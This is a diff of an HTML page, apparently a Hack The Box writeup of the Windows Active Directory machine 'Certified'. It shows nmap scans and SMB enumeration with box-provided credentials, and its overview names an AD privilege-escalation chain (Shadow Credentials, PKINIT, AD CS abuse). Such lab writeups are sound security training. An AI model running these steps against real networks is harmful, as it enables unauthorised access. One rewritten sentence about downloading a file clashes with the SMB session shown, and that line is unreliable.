@@ -3,353 +3,72 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Certified Writeup — Hackthekat</title>
   <meta name="description" content="HTB Certified machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      certified
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>certified</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
@@ -361,152 +80,138 @@
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Certified</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-medium">Medium</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Certified is a Medium difficulty Windows Active Directory machine. Starting with provided credentials, the attack path involves collecting AD data for BloodHound, discovering a <strong>WriteOwner</strong> relationship over a management group, and chaining AD privilege abuse techniques: modifying group membership, adding a <strong>Shadow Credential</strong> via <code>pyWhisker</code>, obtaining a TGT using <strong>PKINITtools</strong>, and extracting NTLM hashes. The escalation continues through <strong>AD CS (Active Directory Certificate Services)</strong> abuse to forge a certificate as Administrator.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250212134637.png" alt="HTB machine info — credentials provided" loading="lazy" /><span class="img-caption">HTB machine info — credentials provided</span></div>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250212134637.png" alt="Pasted image 20250212134637.png" loading="lazy" /><span class="img-caption">Pasted image 20250212134637.png</span></div>
-      <p>Good to know:
-These credentials are allready provided by the box</p>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+      <p>I start with a full port scan to identify all open services. This is an assumed-breach scenario — HTB provides credentials.</p>
       <div class="code-block"><pre><code>nmap -p- 10.129.69.59 -Pn
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 20:35 CET
 Nmap scan report for 10.129.69.59
 Host is up (0.018s latency).
 Not shown: 65514 filtered tcp ports (no-response)
-PORT STATE SERVICE
-53/tcp open domain
-88/tcp open kerberos-sec
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-5985/tcp open wsman
-9389/tcp open adws
-49667/tcp open unknown
-49669/tcp open unknown
-49689/tcp open unknown
-49690/tcp open unknown
-49695/tcp open unknown
-49724/tcp open unknown
-49745/tcp open unknown
-51874/tcp open unknown
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49669/tcp open  unknown
+49689/tcp open  unknown
+49690/tcp open  unknown
+49695/tcp open  unknown
+49724/tcp open  unknown
+49745/tcp open  unknown
+51874/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 236.43 seconds</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the services that are open the ip address.</p>
+      <p>A detailed scan reveals typical AD ports including DNS (53), Kerberos (88), LDAP (389), SMB (445), and WinRM (5985). The FQDN is identified as <code>DC01.certified.htb</code>.</p>
       <div class="code-block"><pre><code>nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49689,49690,49695,49724,49745,51874 -sCV 10.129.69.59 -Pn
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 20:44 CET
 Nmap scan report for certified.htb (10.129.69.59)
 Host is up (0.019s latency).
 
-PORT STATE SERVICE VERSION
-53/tcp open domain Simple DNS Plus
-88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-07 02:45:11Z)
-135/tcp open msrpc Microsoft Windows RPC
-139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-07 02:45:11Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-02-07T02:46:40+00:00; +7h00m45s from scanner time.
 | ssl-cert: Subject: commonName=DC01.certified.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
 | Not valid before: 2024-05-13T15:49:36
-|_Not valid after: 2025-05-13T15:49:36
-445/tcp open microsoft-ds?
-464/tcp open kpasswd5?
-593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+|_Not valid after:  2025-05-13T15:49:36
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-02-07T02:46:39+00:00; +7h00m45s from scanner time.
 | ssl-cert: Subject: commonName=DC01.certified.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
 | Not valid before: 2024-05-13T15:49:36
-|_Not valid after: 2025-05-13T15:49:36
-3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+|_Not valid after:  2025-05-13T15:49:36
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-02-07T02:46:40+00:00; +7h00m45s from scanner time.
 | ssl-cert: Subject: commonName=DC01.certified.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
 | Not valid before: 2024-05-13T15:49:36
-|_Not valid after: 2025-05-13T15:49:36
-3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
+|_Not valid after:  2025-05-13T15:49:36
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-02-07T02:46:39+00:00; +7h00m45s from scanner time.
 | ssl-cert: Subject: commonName=DC01.certified.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.certified.htb
 | Not valid before: 2024-05-13T15:49:36
-|_Not valid after: 2025-05-13T15:49:36
-5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_Not valid after:  2025-05-13T15:49:36
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp open mc-nmf .NET Message Framing
-49667/tcp open msrpc Microsoft Windows RPC
-49669/tcp open msrpc Microsoft Windows RPC
-49689/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-49690/tcp open msrpc Microsoft Windows RPC
-49695/tcp open msrpc Microsoft Windows RPC
-49724/tcp open msrpc Microsoft Windows RPC
-49745/tcp open msrpc Microsoft Windows RPC
-51874/tcp open msrpc Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+49724/tcp open  msrpc         Microsoft Windows RPC
+49745/tcp open  msrpc         Microsoft Windows RPC
+51874/tcp open  msrpc         Microsoft Windows RPC
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_clock-skew: mean: 7h00m44s, deviation: 0s, median: 7h00m44s
 | smb2-security-mode: 
-| 3:1:1: 
-|_ Message signing enabled and required
+|   3:1:1: 
+|_    Message signing enabled and required
 | smb2-time: 
-| date: 2025-02-07T02:46:02
-|_ start_date: N/A
+|   date: 2025-02-07T02:46:02
+|_  start_date: N/A
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 96.90 seconds</code></pre></div>
-      <p>Usefull information found.
-FQDN: DC01.certified.htb</p>
-      <h3 class="writeup-sub-title">SMB Enumations</h3>
-      <p>using the valid credentials I also wanted to see what shares are available for me</p>
+      <h3 class="writeup-sub-title">SMB Enumeration</h3>
+      <p>Using the provided credentials, I check what shares are accessible and attempt to find interesting files, but the shared folders contain nothing exploitable.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[~/HTB/Certified]
 └─$ smbmap -u &quot;judith.mader&quot; -p &quot;judith09&quot; -H 10.129.69.59
 
- ________ ___ ___ _______ ___ ___ __ _______
- /&quot; )|&quot; \ /&quot; || _ &quot;\ |&quot; \ /&quot; | /&quot;&quot;\ | __ &quot;\
- (: \___/ \ \ // |(. |_) :) \ \ // | / \ (. |__) :)
- \___ \ /\ \/. ||: \/ /\ \/. | /&#x27; /\ \ |: ____/
- __/ \ |: \. |(| _ \ |: \. | // __&#x27; \ (| /
- /&quot; \ :) |. \ /: ||: |_) :)|. \ /: | / / \ \ /|__/ \
- (_______/ |___|\__/|___|(_______/ |___|\__/|___|(___/ \___)(_______)
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
- https://github.com/ShawnDEvans/smbmap
+                     https://github.com/ShawnDEvans/smbmap
 
-[\] Checking for open ports... [*] Detected 1 hosts serving SMB
-[|] Authenticating... [/] Authenticating... [-] Authenticating... [*] Established 1 SMB connections(s) and 1 authenticated session(s)
-[\] Enumerating shares... [|] Enumerating shares... [/] Enumerating shares... [-] Enumerating shares... [\] Enumerating shares... [|] Enumerating shares... [/] Enumerating shares... [-] Enumerating shares... [\] Enumerating shares... [|] Enumerating shares... [/] Enumerating shares... 
-[+] IP: 10.129.69.59:445 Name: certified.htb Status: Authenticated
- Disk Permissions Comment
- ---- ----------- -------
- ADMIN$ NO ACCESS Remote Admin
- C$ NO ACCESS Default share
- IPC$ READ ONLY Remote IPC
- NETLOGON READ ONLY Logon server share 
- SYSVOL READ ONLY Logon server share 
-[-] Closing connections.. [*] Closed 1 connections</code></pre></div>
-      <p>I first tried to connect to all share folders but no interesting information could be seen in the shared folders. I tried this by the following command.</p>
+[\] Checking for open ports...                                                                                      [*] Detected 1 hosts serving SMB
+[|] Authenticating...                                                                                               [/] Authenticating...                                                                                               [-] Authenticating...                                                                                               [*] Established 1 SMB connections(s) and 1 authenticated session(s)
+[\] Enumerating shares...                                                                                           [|] Enumerating shares...                                                                                           [/] Enumerating shares...                                                                                           [-] Enumerating shares...                                                                                           [\] Enumerating shares...                                                                                           [|] Enumerating shares...                                                                                           [/] Enumerating shares...                                                                                           [-] Enumerating shares...                                                                                           [\] Enumerating shares...                                                                                           [|] Enumerating shares...                                                                                           [/] Enumerating shares...                                                                                                                                                                                               
+[+] IP: 10.129.69.59:445        Name: certified.htb             Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+[-] Closing connections..                                                                                           [*] Closed 1 connections</code></pre></div>
+      <p>I download the file from the SMB share using the <code>get</code> command for local analysis.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified]
-└─$ smbclient \\\\10.129.231.186\\IPC$ -U &#x27;judith.mader&#x27; 
+└─$ smbclient \\\\10.129.231.186\\IPC$ -U &#x27;judith.mader&#x27;                    
 Password for [WORKGROUP\judith.mader]:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; ls
@@ -514,23 +219,25 @@ NT_STATUS_NO_SUCH_FILE listing \*
 smb: \&gt; excit
 excit: command not found
 smb: \&gt; exit</code></pre></div>
-      <p>And I did this for each shared folder but nothing interesting to see.
